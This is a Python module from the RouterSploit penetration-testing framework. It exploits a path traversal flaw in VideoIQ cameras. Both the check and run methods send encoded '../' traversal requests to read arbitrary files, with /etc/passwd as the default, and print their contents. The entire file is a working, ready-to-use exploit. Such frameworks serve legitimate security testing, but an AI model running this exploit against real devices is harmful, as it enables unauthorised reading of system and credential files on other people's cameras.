from routersploit import (
    exploits,
    print_error,
    print_info,
    print_success,
    print_status,
    http_request,
    mute,
    validators
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for VideoIQ Camera Path Traversal vulnerability.
    If target is vulnerable it is possible to read file from the file system.
    """
    __info__ = {
        'name': 'VideoIQ Camera Path Traversal',
        'description': 'Module exploits VideoIQ Camera Path Traversal vulnerability. If target is vulnerable '
                       'it is possible to read file from file system.',
        'authors': [
            'Yakir Wizman',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/40284/',
        ],
        'devices': [
            'VideoIQ Camera',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(8080, 'Target port', validators=validators.integer)  # default port

    filename = exploits.Option('/etc/passwd', 'File to read from file system')

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")

            url = "{}:{}/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C..{}" \
                  .format(self.target, self.port, self.filename)

            response = http_request(method="GET", url=url)
            if response is None:
                print_error("Exploit failed - could not read response")
                return

            print_status("Trying to read file: {}".format(self.filename))
            if any(err in response.text for err in ['Error 404 NOT_FOUND', 'Problem accessing', 'HTTP ERROR 404']):
                print_status("File does not exist: {}".format(self.filename))
                return

            if response.text:
                print_info(response.text)
            else:
                print_status("File seems to be empty")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        url = "{}:{}/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd" \
              .format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is not None and "root:" in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable
